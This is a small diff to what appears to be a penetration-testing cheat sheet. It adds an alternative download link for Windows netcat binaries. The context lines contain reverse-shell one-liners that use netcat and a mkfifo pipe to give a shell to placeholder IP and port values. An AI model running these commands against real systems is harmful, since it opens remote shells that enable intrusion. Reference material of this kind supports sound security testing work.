@@ -246,7 +246,7 @@ nc -e /bin/sh <IP> <PORT> &
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 
 # Windows
-# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
+# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
 nc.exe -e cmd.exe <IP> <PORT>
 nc64.exe -e cmd.exe <IP> <PORT>
 ```
